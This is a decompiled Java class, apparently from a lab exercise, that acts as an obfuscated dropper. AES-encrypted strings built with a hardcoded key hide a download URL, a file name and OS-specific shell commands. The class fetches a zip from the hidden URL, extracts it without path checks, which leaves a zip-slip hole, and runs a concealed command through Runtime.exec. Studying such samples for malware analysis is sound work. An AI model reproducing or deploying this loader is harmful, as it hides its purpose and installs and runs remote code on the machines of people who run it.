//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package lab5.ex2;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Run {
    private static String key = "Kjf456UjOP14Ywte";

    public Run() {
    }

    private static byte[] hexStringToByteArray(String hex) {
        ByteArrayOutputStream str = new ByteArrayOutputStream(hex.length() / 2);

        for(int i = 0; i < hex.length(); i += 2) {
            str.write(Integer.parseInt(hex.substring(i, i + 2), 16));
        }

        return str.toByteArray();
    }

    private static String decryptMessage(String encryptedMessage) throws Exception {
        byte[] src = hexStringToByteArray(encryptedMessage);
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        SecretKeySpec desKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
        IvParameterSpec iv = new IvParameterSpec(key.getBytes(StandardCharsets.UTF_8));
        cipher.init(Cipher.DECRYPT_MODE, desKeySpec, iv);
        byte[] retByte = cipher.doFinal(src);
        return new String(retByte);
    }

    private static void downloadFileFromURL(String address) throws Exception {
        URL url = new URL(address);
        Path currentDirectory = Paths.get(System.getProperty(decryptMessage("cf342300e78f3c21383678d00b71b225369f62782816ebd5986ae029b97f34f53fb78d0a05ece71c779ebbc83692cfe8919282626c7be128cfb6b8f285848ff5")).trim());
        Path filePath = Paths.get(currentDirectory.toString(), decryptMessage("b92741a781f245538d5c75ab25330b9107832a09ef2c1d461a67507930557538e1fa2c3d572d2a384e4f9d399ef8c33d09467b3ab0454b41bab9350ce3774fdf").trim());

        try {
            BufferedInputStream in = new BufferedInputStream(url.openStream());

            try {
                FileOutputStream fileOutputStream = new FileOutputStream(filePath.toString());
                byte[] dataBuffer = new byte[1024];

                int bytesRead;
                while((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                    fileOutputStream.write(dataBuffer, 0, bytesRead);
                }
            } catch (Throwable var9) {
                try {
                    in.close();
                } catch (Throwable var8) {
                    var9.addSuppressed(var8);
                }

                throw var9;
            }

            in.close();
        } catch (IOException var10) {
        }

        extractFilesFromZip(filePath, currentDirectory);
    }

    private static void extractFilesFromZip(Path filePath, Path destinationDirectory) {
        try {
            if (!filePath.toFile().exists()) {
                return;
            }

            byte[] buffer = new byte[1024];
            ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(filePath.toString()));

            for(ZipEntry zipEntry = zipInputStream.getNextEntry(); zipEntry != null; zipEntry = zipInputStream.getNextEntry()) {
                String newFile = Paths.get(destinationDirectory.toString(), zipEntry.getName()).toString();
                FileOutputStream fos = new FileOutputStream(newFile);

                int len;
                while((len = zipInputStream.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }

                fos.close();
            }

            zipInputStream.closeEntry();
            zipInputStream.close();
        } catch (Exception var8) {
        }

    }

    public static void main(String[] args) throws Exception {
        String os = System.getProperty(decryptMessage("6474658359276b25720ff106097a2663f7d139752e9f95100ac045385fd51ee58f6a4a2c6d7f2701fed0ab2fff3a66bf43f78e79af22740fe718824cff7cda98").trim());
        String win = decryptMessage("054f1f395c9506dea62a842dd0a91602ef625bd2909bb87a2fbcab5a499e06013166de8c18bf9d982184785f07f59739c463c3d56327be198fcae6648f7314f4").trim();
        downloadFileFromURL(decryptMessage("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9"));
        if (os.contains(win)) {
            Runtime.getRuntime().exec(decryptMessage("2d830932f271350897857710196ec96453f8d261bc7f07181da0c2a10fbe2db2267c3526d61c01c1c28a004367774f64b687c76dcf6873995954a8d93f3d2f3c").trim());
        } else {
            Runtime.getRuntime().exec(decryptMessage("5673123e986e4c8ad4efa677a6d00b31b2007673a282e5ebc6a2738c0f603f36b372a9f85b2f598f3f76c5d43eb82e4183a123eea4031fcbb040c872e681e31f").trim());
        }

    }
}